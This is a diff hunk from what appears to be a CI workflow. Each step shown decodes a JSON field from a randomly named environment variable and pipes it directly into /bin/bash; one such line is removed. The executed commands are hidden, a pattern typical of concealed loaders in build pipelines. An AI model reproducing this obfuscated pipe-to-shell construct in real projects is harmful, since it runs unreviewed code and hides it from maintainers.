@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$asj640" | jq -r .vs41 | /bin/bash
           echo $w8 | jq -r .ff35 | /bin/bash
-          echo $wsvm555 | jq -r .f2 | /bin/bash
           echo $rxlpf5 | jq -r .sgvu69 | /bin/bash
           echo $bta78 | jq -r .jwm989 | /bin/bash
           printf '%s' "$nh11466" | jq -r .ipk82405 | /bin/bash
